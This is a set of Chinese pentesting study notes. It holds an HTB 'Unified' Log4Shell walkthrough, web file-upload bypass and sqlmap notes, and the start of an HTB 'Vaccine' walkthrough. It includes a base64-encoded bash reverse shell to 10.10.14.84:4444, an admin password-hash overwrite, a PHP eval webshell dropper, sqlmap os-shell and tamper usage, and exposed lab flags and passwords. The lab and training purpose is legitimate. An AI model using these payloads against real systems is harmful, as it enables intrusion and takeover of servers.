-jar RogueJndi-1.1.jar --command &quot;bash -c &#123;echo,L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYvZGV2L3RjcC8xMC4xMC4xNC44NC80NDQ0IDA+JjEnCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; --hostname &quot;10.10.14.84&quot; +-+-+-+-+-+-+-+-+-+|R|o|g|u|e|J|n|d|i|+-+-+-+-+-+-+-+-+-+Starting HTTP server on 0.0.0.0:8000Starting LDAP server on 0.0.0.0:1389Mapping ldap://10.10.14.84:1389/o=websphere1 to artsploit.controllers.WebSphere1Mapping ldap://10.10.14.84:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1Mapping ldap://10.10.14.84:1389/ to artsploit.controllers.RemoteReferenceMapping ldap://10.10.14.84:1389/o=reference to artsploit.controllers.RemoteReferenceMapping ldap://10.10.14.84:1389/o=tomcat to artsploit.controllers.TomcatMapping ldap://10.10.14.84:1389/o=websphere2 to artsploit.controllers.WebSphere2Mapping ldap://10.10.14.84:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2Mapping ldap://10.10.14.84:1389/o=groovy to artsploit.controllers.Groovy 12345678┌──(root㉿kali)-[/home/kali/Desktop]└─# nc -lvp 4444 listening on [any] 4444 ...10.129.202.83: inverse host lookup failed: Unknown hostconnect to [10.10.14.84] from (UNKNOWN) [10.129.202.83] 48416bash: cannot set terminal process group (7): Inappropriate ioctl for devicebash: no job control in this shellunifi@unified:/usr/lib/unifi$ 1234567891011121314unifi@unified:/usr/lib/unifi$ ls -alls -altotal 40drwxr-xr-x 1 unifi unifi 4096 Jul 31 12:36 .drwxr-xr-x 1 root root 4096 Jan 2 2022 ..drwxr-xr-x 2 unifi unifi 4096 Jan 2 2022 binlrwxrwxrwx 1 root root 11 Sep 20 2021 data -&gt; /unifi/datadrwxr-xr-x 3 unifi unifi 4096 Jan 2 2022 dldrwxr-xr-x 3 unifi unifi 12288 Jan 2 2022 liblrwxrwxrwx 1 root root 10 Sep 20 2021 logs -&gt; /unifi/loglrwxrwxrwx 1 root root 14 Sep 20 2021 run -&gt; /var/run/unifidrwxr-xr-x 3 unifi unifi 4096 Jan 2 2022 webappsdrwxr-xr-x 3 unifi unifi 4096 Jul 31 12:36 workunifi@unified:/usr/lib/unifi$ 发现user flag： 123unifi@unified:/home/michael$ cat user.txtcat user.txt6ced1a6a89e666c0620cdb10262ba127 提权部分：查看进程，发现bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1 MongoDB是一个源代码可用的跨平台面向文档的数据库程序。MongoDB被归类为NoSQL数据库程序，它使用具有可选模式的类似JSON的文档。 12345678910111213141516unifi@unified:/usr/lib/unifi$ ps auxps auxUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDunifi 1 0.0 0.0 1080 4 ? Ss 12:36 0:00 /sbin/docker-init -- /usr/local/bin/docker-entrypoint.sh unifiunifi 7 0.0 0.1 18512 3044 ? S 12:36 0:00 bash /usr/local/bin/docker-entrypoint.sh unifiunifi 17 0.8 27.3 3676460 555952 ? Sl 12:36 0:53 java -Dunifi.datadir=/unifi/data -Dunifi.logdir=/unifi/log -Dunifi.rundir=/var/run/unifi -Xmx1024M -Djava.awt.headless=true -Dfile.encoding=UTF-8 -jar /usr/lib/unifi/lib/ace.jar startunifi 67 0.2 4.1 1101696 85156 ? Sl 12:36 0:17 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1unifi 1969 0.0 0.1 18380 3088 ? S 13:45 0:00 bash -c &#123;echo,L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYvZGV2L3RjcC8xMC4xMC4xNC44NC80NDQ0IDA+JjEnCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;unifi 1973 0.0 0.1 18512 3288 ? S 13:45 0:00 bash -iunifi 1976 0.0 0.1 18380 2992 ? S 13:45 0:00 /bin/bash -c /bin/bash -i &gt;&amp;/dev/tcp/10.10.14.84/4444 0&gt;&amp;1unifi 1977 0.0 0.1 18512 3448 ? S 13:45 0:00 /bin/bash -iunifi 2874 0.0 0.1 18380 3104 ? S 14:18 0:00 bash -c &#123;echo,L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYvZGV2L3RjcC8xMC4xMC4xNC44NC80NDQ0IDA+JjEnCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;unifi 2878 0.0 0.1 18512 3356 ? S 14:18 0:00 bash -iunifi 2881 0.0 0.1 18380 2984 ? S 14:18 0:00 /bin/bash -c /bin/bash -i &gt;&amp;/dev/tcp/10.10.14.84/4444 0&gt;&amp;1unifi 2882 0.0 0.1 18512 3216 ? S 14:18 0:00 /bin/bash -iunifi 2899 0.0 0.1 34408 2824 ? R 14:19 0:00 ps aux 让我们通过使用mongo命令行实用程序并尝试提取管理员密码来与MongoDB服务进行交互。使用关键字UniFi Default Database在谷歌上快速搜索显示，UniFi应用程序的默认数据库名称为ace。 123456789101112unifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --eval &quot;db.admin.find().forEach(printjson);&quot;&lt;17 ace --eval &quot;db.admin.find().forEach(printjson);&quot;MongoDB shell version v3.6.3connecting to: mongodb://127.0.0.1:27117/aceMongoDB server version: 3.6.3&#123; &quot;_id&quot; : ObjectId(&quot;61ce278f46e0fb0012d47ee4&quot;), &quot;name&quot; : &quot;administrator&quot;, &quot;email&quot; : &quot;administrator@unified.htb&quot;, &quot;x_shadow&quot; : &quot;$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.&quot;, &quot;time_created&quot; : NumberLong(1640900495), &quot;last_site_name&quot; : &quot;default&quot;, 输出显示一个名为Administrator的用户。他们的密码散列位于x_shadow变量中，但在这种情况下，任何密码破解实用程序都无法破解它。相反，我们可以用自己创建的哈希更改x_shadow密码哈希，以便替换管理员密码并向管理面板进行身份验证。为此，我们可以使用mkpasswd命令行实用程序。 先使用mkpasswd -m sha-512 password命令，得到password的sha512加密后的值： 123┌──(root㉿kali)-[/home/kali/Desktop]└─# mkpasswd -m sha-512 password$6$eLXCcCov55K4HCAT$29tc0YWNS6dOqvVCwzgLqzEjpAgZCGejesNSDxBaq2wYqVKvx1ezCtB9Py49tVIH9jc0Z1F778xCAgCuwAv1V. 将administrator的密码修改为password： 123456unifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --eval &#x27;db.admin.update(&#123;&quot;_id&quot;:ObjectId(&quot;61ce278f46e0fb0012d47ee4&quot;)&#125;,&#123;$set：&#123;&quot;x_shadow&quot;:&quot;$6$hwb9W.VC28pwXtPT$N8DRe.81H.wB3NN5Ac/5zhGdQkKAibE/i/7I6kvKaVbWGYApa9EghEhtyqtz39qS6x6oDNRNo5z9Nk9m2VMio0&quot;&#125;&#125;)&#x27;&lt;aVbWGYApa9EghEhtyqtz39qS6x6oDNRNo5z9Nk9m2VMio0&quot;&#125;&#125;)&#x27;MongoDB shell version v3.6.3connecting to: mongodb://127.0.0.1:27117/aceMongoDB server version: 3.6.32023-07-31T15:15:08.132+0100 E QUERY [thread1] SyntaxError: illegal character @(shell eval):1:66 SHA-512或安全哈希算法512是一种哈希算法，用于将任何长度的文本转换为固定大小的字符串。每个输出产生一个长度为512位（64字节）的SHA-512。该算法通常用于电子邮件地址哈希、密码哈希… 在哈希过程中添加salt，以强制其唯一性，在不增加用户需求的情况下增加其复杂性，并减轻哈希表等密码攻击。 1234567unifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --eval &#x27;db.admin.update(&#123;&quot;_id&quot;:ObjectId(&quot;61ce278f46e0fb0012d47ee4&quot;)&#125;,&#123;$set:&#123;&quot;x_shadow&quot;:&quot;$6$eLXCcCov55K4HCAT$29tc0YWNS6dOqvVCwzgLqzEjpAgZCGejesNSDxBaq2wYqVKvx1ezCtB9Py49tVIH9jc0Z1F778xCAgCuwAv1V.&quot;&#125;&#125;)&#x27; &lt;q2wYqVKvx1ezCtB9Py49tVIH9jc0Z1F778xCAgCuwAv1V.&quot;&#125;&#125;)&#x27; MongoDB shell version v3.6.3 connecting to: mongodb://127.0.0.1:27117/ace MongoDB server version: 3.6.3 WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;) unifi@unified:/usr/lib/unifi$ 查看结果有没有修改成功： 123456789101112unifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --eval &quot;db.admin.find().forEach(printjson);&quot; &lt;17 ace --eval &quot;db.admin.find().forEach(printjson);&quot; MongoDB shell version v3.6.3 connecting to: mongodb://127.0.0.1:27117/ace MongoDB server version: 3.6.3 &#123; &quot;_id&quot; : ObjectId(&quot;61ce278f46e0fb0012d47ee4&quot;), &quot;name&quot; : &quot;administrator&quot;, &quot;email&quot; : &quot;administrator@unified.htb&quot;, &quot;x_shadow&quot; : &quot;$6$eLXCcCov55K4HCAT$29tc0YWNS6dOqvVCwzgLqzEjpAgZCGejesNSDxBaq2wYqVKvx1ezCtB9Py49tVIH9jc0Z1F778xCAgCuwAv1V.&quot;, &quot;time_created&quot; : NumberLong(1640900495), &quot;last_site_name&quot; : &quot;default&quot;, 使用管理员用户和密码成功登录，在setting里可以发现root的密码：NotACrackablePassword4U2022，使用ssh连接root用户： 12345678┌──(root㉿kali)-[/home/kali/Desktop]└─# ssh root@10.129.202.83root@10.129.202.83&#x27;s password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 最后的root flag在这里： 1234root@unified:~# lsroot.txtroot@unified:~# cat root.txt e50bc93c75b634e4b272d2f771c33681 Listening You may be wondering what it is, and why people are so concerned about it. Some even call it the worst vulnerability since Wannna Cry. Log4j is a popular logging library for Java created in 2001. It is part of the Apache Software Foundation, however, this doesn’t mean the maintainers are paid. All of their work is volunteer-based. The logging library’s main purpose is to provide developers with a way to change the format and verbosity of logging through configuration files versus code.","tags":["HTB","笔记","STARTING POINT"],"categories":["Range","HTB"]},{"title":"第47天：WEB攻防-PHP应用&文件上传&函数缺陷&条件竞争&二次渲染&黑白名单&JS绕过","path":"/2023/07/28/xiaodi8/web/web攻防笔记第47天/","content":"47学习前必读：1、课前一定要明白：无文件解析安全问题上，格式解析是一对一的（不能jpg解析php）换句话来说有解析错误配置或后缀解析漏洞时才能实现格式差异解析 2、文件上传安全指的是攻击者通过利用上传实现后门的写入连接后门进行权限控制的安全问题，对于如何确保这类安全问题，一般会从原生态功能中的文件内容，文件后缀，文件类型等方面判断，但是漏洞可能不仅在本身的代码验证逻辑中出现安全问题，也会在语言版本，语言函数，中间件，引用的第三方编辑器等存在缺陷地方配合利用。另外文件上传也有多个存储逻辑，不同的文件存储方案也会给攻击者带来不一样的挑战！ 测试环境安装参考：https://github.com/ffffffff0x/f8x https://github.com/fuzzdb-project/fuzzdb https://github.com/sqlsec/upload-labs-docker 下载上述资源 docker安装 f8x -d 或 f8x -docker 进入项目文件夹 cd upload-labs-docker 一键部署运行docker-compose up -d upload-labs-docker知识点：1、前端JS 💡 如何判断是否是前端验证呢？ 首先抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个多半就是前端校验了 第一关：使用哥斯拉生成后门在可上传文件类型（如.jpg）中，上传后，因前端验证，后端不验证，所以抓包修改文件类型，直接发送.php文件，再连接就行。 2、.htaccess（中间件）AddType application/x-httpd-php .png 借助这个配置让.png的命名文件当做类型application/x-httpd-php .png执行（php的类型） 当做php执行 htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页301重定向、自定义 404 错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能 第二关：上传2.php，抓包该参数，文件格式改成.htaccess，内容改成AddType application/x-httpd-php .png ，接着上传2.png，内容包含php木马后门，直接哥斯拉连接2.png 3、MIME类型Content-Type：image/png 媒体类型 （通常称为Multipurpose Internet Mail Extensions或MIME类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式。 MIME的组成结构非常简单；由类型与子类型两个字符串中间用 ‘&#x2F;‘ 分隔而组成。不允许空格存在。type 表示可以被分多个子类的独立类别。subtype 表示细分后的每个类型。 通用的结构为： 1type/subtype MIME类型对大小写不敏感，但是传统写法都是小写。 第三关：修改类型就行了，验证方式不能只通过一种方式，需要多方位去验证 4、文件头判断GIF89a 一个文件里面的内容到底是啥？用惯了Windows的人肯定是看后缀。但是后缀这个东西说改就改，不可靠。所以，最保险的还是把文件类型信息写到文件里面，通常来说，也就是写到文件开头的那几个字节。这是最方便，最快捷的用来辨别一个文件真实内容的方法。 常见的文件头标志如下： JPEG (jpg)，文件头： 1FFD8FF PNG (png)，文件头： 189504E47 GIF (gif)，文件头： 147494638 HTML (html)，文件头： 168746D6C3E ZIP Archive (zip)，文件头： 1504B0304 RAR Archive (rar)，文件头： 152617221 Adobe Acrobat (pdf)，文件头： 1255044462D312E MS Word&#x2F;Excel (xls.or.doc)，文件头： 1D0CF11E0 第四关：修改上传文件前缀为GIF，然后抓包把类型也改了，上传 5、黑名单-过滤不严无递归，pphphp，也没有过滤大小写 第五关：上传一个.pphphp 6、黑名单-过滤不严系统大小写敏感属性 因为题目环境是 Docker 容器运行的 Linux 系统，所以本题人工修改成了 Windows 的特性 Linux区分大小写，Windows不区分 第六关：上传一个.Php 7、低版本GET-%00截断自动解码一次 /var/www/html/upload/x.php%00 url上面 %00 （自动解码一次） PHP 内核是由 C 语言实现的，所以使用了 C 语言中的一些字符串处理函数。比如在连接字符串时候， 0 字节(\\x00) 将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个 0 字节，就能截断 file 变量之后的字符串 这种方法只适用于 magic_quotes_gpc &#x3D; Off PHP 版本小于 5.3.4 第七关：确认版本无误后，上传正确格式包含木马的图片文件，抓包，修改GET上传路径，使用%00截断后面的内容 8、低版本POST-%00截断（环境要求与第七题同）手工解码一次 ../upload/x.php%00 二次解码 00截断 是%00解码结果 post下面 %00 （手工解码一次） 第八关：上传正确格式包含木马的图片文件，抓包，修改POST数据包下面上传路径，使用%00截断后面的内容，接着使用解码解回去发送 9、黑名单-过滤不严php3 fuzzdbmaster项目中的字典，后缀爆破：attack file-upload altextensions-php.txt 第九关：抓包，php字典后缀爆破，看长度和响应路径 10、逻辑不严-条件竞争 逻辑缺陷-先上传后判断 → 访问即创建代码（访问了自动触发代码 新建一个文件写入后门） 正确：先判断，后上传&lt;?php fputs(fopen(&#39;xiao.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_REQUEST[1]);?&gt;&#39;);?&gt;上传不断发包请求不断发包 条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。 攻击者上传了一个用来生成恶意 shell 的文件，在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意 shell 的文件。至此，该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功的在服务器中植入了一个shell 文件，后续的一切就都不是问题了。 不过竞争的马因为生存周期短的原因，所以和普通的 Webshell 不太一样，他的使命是在有限的生命中等待一个有缘人的光顾，然后快速生成一个小 Webshell，落红不是无物，化作春泥更护花（泪目）。 第十关：在文件停留过服务器的一秒内快速访问生成后门，使用Null payloads和continue indefinitely持续访问30010以及30010&#x2F;upload&#x2F;xiao.php，然后一直刷新 我的电脑好像太慢了，一直刷不出来，绝 11、二次渲染先搞个正常图片，上传导出渲染后的图片对比保留部分，在保留部分添加后门代码最后利用提示的文件包含执行图片后门代码 第十一关：使用16进制编辑器把后门插入到两个图片保留的一样部分 12、函数缺陷move_uploaded_file 1.php/. 如果可以让我们自己发挥重命名，那么shell.php/. 可以上传一个php文件 13、代码审计-数组绕过—————————–174283082921961Content-Disposition: form-data; name&#x3D;”save_name[0]” http://2.php/—————————–174283082921961Content-Disposition: form-data; name&#x3D;”save_name[2]” gif","tags":["笔记","xiaodi8","web攻防"],"categories":["小迪","web攻防"]},{"title":"第46天：WEB攻防-注入工具&SQLMAP&Tamper编写&指纹修改&高权限操作&目录架构","path":"/2023/07/26/xiaodi8/web/web攻防笔记第46天/","content":"参考资料：https://www.cnblogs.com/bmjoker/p/9326258.html 最重要的：搞清楚数据库类型 数据猜解-库表列数据&amp;字典测试：http://vulnweb.com/ 1234567--current-db #获取当前数据库名--tables -D &quot;数据库名&quot; #获取表名--columns -T &quot;表名&quot; -D &quot;数据库名&quot; #获取列名--dump -C &quot;列名&quot; -T &quot;表名&quot; -D &quot;数据库名&quot; #获取数据 权限操作-文件&amp;命令&amp;交互式测试：MYSQL高权限注入 12345678910111213#引出权限：--is-dba #查看权限--privileges #是否是数据库管理员#引出文件：--file-read #读取指定文件--file-write #写入本地文件--file-dest #引出命令：--os-cmd=ver/calc--os-shell --sql-shell 提交方法-POST&amp;HEAD&amp;JSON测试：Post Cookie Json 12345--data &quot;&quot; #表单里POST请求，抓包找数据请求，不推荐--cookie &quot;&quot; #Cookie，不推荐-r 1.txt #推荐，数据完整性。把请求标头放进文件，但其实文件里不知道注入点，可使用星号（*）标明注入点 绕过模块-Tamper脚本-使用&amp;开发测试：base64注入 有过滤的注入 tamper模块：里面有很多脚本，可以直接使用，查看说明书就行 12345678910111213141516171819--tamper=base64encode.py--tamper=test.py#bypass.pyfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies(): pass#对于有过滤的语句怎么绕过，大小写替换def tamper(payload, **kwargs): if payload: payload = payload.replace(&#x27;SELECT&#x27;,&#x27;sElEct&#x27;) payload = payload.replace(&#x27;OR&#x27;,&#x27;Or&#x27;) payload = payload.replace(&#x27;AND&#x27;,&#x27;And&#x27;) payload = payload.replace(&#x27;SLEEP&#x27;,&#x27;SleeP&#x27;) payload = payload.replace(&#x27;ELT&#x27;,&#x27;Elt&#x27;) return payload 分析拓展-代理&amp;调试&amp;指纹&amp;风险&amp;等级1、后期分析调试： 123-v=(0-6) #详细的等级(0-6)，4HTTP请求用的比较多--proxy &quot;http://xx:xx&quot; #代理注入 2、打乱默认指纹（sqlmap特征-UA打头）： 12345--user-agent &quot;&quot; #自定义user-agent--random-agent #随机user-agent--time-sec=(2,5) #延迟响应，默认为5 3、使用更多的测试：测试Header注入 123--level=(1-5) #要执行的测试水平等级（深度），默认为1 --risk=(0-3) #测试执行的风险等级，默认为1 代理池：使用快代理隧道代理（价格略高）","tags":["笔记","xiaodi8","web攻防"],"categories":["小迪","web攻防"]},{"title":"HTB-Vaccine","path":"/2023/07/24/HTB/HTB-Vaccine/","content":"开局资料： https://blog.csdn.net/qq_40927195&#x2F;article&#x2F;details&#x2F;126604517 HTB-Vaccine - laolao - 博客园 (cnblogs.com) 先扫： 123456789101112131415161718192021222324252627282930313233343536373839┌──(root㉿kali)-[/home/kali]└─# nmap -sC -sV 10.129.103.172Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-24 01:48 EDTNmap scan report for 10.129.103.172Host is up (0.42s latency).Not shown: 944 closed tcp ports (reset), 53 filtered tcp ports (no-response)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rwxr-xr-x 1 0 0 2533 Apr 13 2021 backup.zip| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.10.14.54| Logged in as ftpuser| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 3| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 c0ee58077534b00b9165b259569527a4 (RSA)| 256 ac6e81188922d7a7417d814f1bb8b251 (ECDSA)|_ 256 425bc321dfefa20bc95e03421d69d028 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: MegaCorp Login| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 261.22 seconds 发现FTP允许匿名登录： 123456789101112131415161718192021222324252627282930┌──(root㉿kali)-[/home/kali/Desktop]└─# ftp 10.129.103.172Connected to 10.129.103.172.220 (vsFTPd 3.0.3)Name (10.129.103.172:kali): anonymous331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; dir229 Entering Extended Passive Mode (|||10156|)150 Here comes the directory listing.-rwxr-xr-x 1 0 0 2533 Apr 13 2021 backup.zip226 Directory send OK.ftp&gt; get backup.ziplocal: backup.zip remote: backup.zip229 Entering Extended Passive Mode (|||10939|)150 Opening BINARY mode data connection for backup.zip (2533 bytes).100% |************************************| 2533 8.59 MiB/s 00:00 ETA226 Transfer complete.2533 bytes received in 00:00 (16.95 KiB/s)ftp&gt; exit221 Goodbye.┌──(root㉿kali)-[/home/kali/Desktop]└─# unzip backup.zip Archive: backup.zip[backup.zip] index.php password: password incorrect--reenter: 下载下来buckup.zip，解压发现需要密码，尝试简单密码后发现不行，直接开膛手crack： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117┌──(root㉿kali)-[/home/kali/Desktop]└─# john --help John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 SSE2 AC]Copyright (c) 1996-2021 by Solar Designer and othersHomepage: https://www.openwall.com/john/Usage: john [OPTIONS] [PASSWORD-FILES]--help Print usage summary--single[=SECTION[,..]] &quot;Single crack&quot; mode, using default or named rules--single=:rule[,..] Same, using &quot;immediate&quot; rule(s)--single-seed=WORD[,WORD] Add static seed word(s) for all salts in single mode--single-wordlist=FILE *Short* wordlist with static seed words/morphemes--single-user-seed=FILE Wordlist with seeds per username (user:password[s] format)--single-pair-max=N Override max. number of word pairs generated (6)--no-single-pair Disable single word pair generation--[no-]single-retest-guess Override config for SingleRetestGuess--wordlist[=FILE] --stdin Wordlist mode, read words from FILE or stdin --pipe like --stdin, but bulk reads, and allows rules--rules[=SECTION[,..]] Enable word mangling rules (for wordlist or PRINCE modes), using default or named rules--rules=:rule[;..]] Same, using &quot;immediate&quot; rule(s)--rules-stack=SECTION[,..] Stacked rules, applied after regular rules or to modes that otherwise don&#x27;t support rules--rules-stack=:rule[;..] Same, using &quot;immediate&quot; rule(s)--rules-skip-nop Skip any NOP &quot;:&quot; rules (you already ran w/o rules)--loopback[=FILE] Like --wordlist, but extract words from a .pot file--mem-file-size=SIZE Size threshold for wordlist preload (default 2048 MB)--dupe-suppression Suppress all dupes in wordlist (and force preload)--incremental[=MODE] &quot;Incremental&quot; mode [using section MODE]--incremental-charcount=N Override CharCount for incremental mode--external=MODE External mode or word filter--mask[=MASK] Mask mode using MASK (or default from john.conf)--markov[=OPTIONS] &quot;Markov&quot; mode (see doc/MARKOV)--mkv-stats=FILE &quot;Markov&quot; stats file--prince[=FILE] PRINCE mode, read words from FILE--prince-loopback[=FILE] Fetch words from a .pot file--prince-elem-cnt-min=N Minimum number of elements per chain (1)--prince-elem-cnt-max=[-]N Maximum number of elements per chain (negative N is relative to word length) (8)--prince-skip=N Initial skip--prince-limit=N Limit number of candidates generated--prince-wl-dist-len Calculate length distribution from wordlist--prince-wl-max=N Load only N words from input wordlist--prince-case-permute Permute case of first letter--prince-mmap Memory-map infile (not available with case permute)--prince-keyspace Just show total keyspace that would be produced (disregarding skip and limit)--subsets[=CHARSET] &quot;Subsets&quot; mode (see doc/SUBSETS)--subsets-required=N The N first characters of &quot;subsets&quot; charset are the &quot;required set&quot;--subsets-min-diff=N Minimum unique characters in subset--subsets-max-diff=[-]N Maximum unique characters in subset (negative N is relative to word length)--subsets-prefer-short Prefer shorter candidates over smaller subsets--subsets-prefer-small Prefer smaller subsets over shorter candidates--make-charset=FILE Make a charset, FILE will be overwritten--stdout[=LENGTH] Just output candidate passwords [cut at LENGTH]--session=NAME Give a new session the NAME--status[=NAME] Print status of a session [called NAME]--restore[=NAME] Restore an interrupted session [called NAME]--[no-]crack-status Emit a status line whenever a password is cracked--progress-every=N Emit a status line every N seconds--show[=left] Show cracked passwords [if =left, then uncracked]--show=formats Show information about hashes in a file (JSON)--show=invalid Show lines that are not valid for selected format(s)--test[=TIME] Run tests and benchmarks for TIME seconds each (if TIME is explicitly 0, test w/o benchmark)--stress-test[=TIME] Loop self tests forever--test-full=LEVEL Run more thorough self-tests--no-mask Used with --test for alternate benchmark w/o mask--skip-self-tests Skip self tests--users=[-]LOGIN|UID[,..] [Do not] load this (these) user(s) only--groups=[-]GID[,..] Load users [not] of this (these) group(s) only--shells=[-]SHELL[,..] Load users with[out] this (these) shell(s) only--salts=[-]COUNT[:MAX] Load salts with[out] COUNT [to MAX] hashes, or--salts=#M[-N] Load M [to N] most populated salts--costs=[-]C[:M][,...] Load salts with[out] cost value Cn [to Mn]. For tunable cost parameters, see doc/OPTIONS--fork=N Fork N processes--node=MIN[-MAX]/TOTAL This node&#x27;s number range out of TOTAL count--save-memory=LEVEL Enable memory saving, at LEVEL 1..3--log-stderr Log to screen instead of file--verbosity=N Change verbosity (1-5 or 6 for debug, default 3)--no-log Disables creation and writing to john.log file--bare-always-valid=Y Treat bare hashes as valid (Y/N)--catch-up=NAME Catch up with existing (paused) session NAME--config=FILE Use FILE instead of john.conf or john.ini--encoding=NAME Input encoding (eg. UTF-8, ISO-8859-1). See also doc/ENCODINGS.--input-encoding=NAME Input encoding (alias for --encoding)--internal-codepage=NAME Codepage used in rules/masks (see doc/ENCODINGS)--target-encoding=NAME Output encoding (used by format)--force-tty Set up terminal for reading keystrokes even if we&#x27;re not the foreground process--field-separator-char=C Use &#x27;C&#x27; instead of the &#x27;:&#x27; in input and pot files--[no-]keep-guessing Try finding plaintext collisions--list=WHAT List capabilities, see --list=help or doc/OPTIONS--length=N Shortcut for --min-len=N --max-len=N--min-length=N Request a minimum candidate length in bytes--max-length=N Request a maximum candidate length in bytes--max-candidates=[-]N Gracefully exit after this many candidates tried. (if negative, reset count on each crack)--max-run-time=[-]N Gracefully exit after this many seconds (if negative, reset timer on each crack)--mkpc=N Request a lower max. keys per crypt--no-loader-dupecheck Disable the dupe checking when loading hashes--pot=NAME Pot file to use--regen-lost-salts=N Brute force unknown salts (see doc/OPTIONS)--reject-printable Reject printable binaries--tune=HOW Tuning options (auto/report/N)--subformat=FORMAT Pick a benchmark format for --format=crypt--format=[NAME|CLASS][,..] Force hash of type NAME. The supported formats can be seen with --list=formats and --list=subformats. See also doc/OPTIONS for more advanced selection of format(s), including using classes and wildcards. we will have to convert the ZIP into the hash using the zip2john module that comes within John the Ripper： 1234567891011┌──(root㉿kali)-[/home/kali/Desktop]└─# zip2john backup.zip &gt; hashesver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8NOTE: It is assumed that all files in each archive have the same password.If that is not the case, the hash may be uncrackable. To avoid this, useoption -o to pick a file at a time.┌──(root㉿kali)-[/home/kali/Desktop]└─# cat hashesbackup.zip:$pkzip$2*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f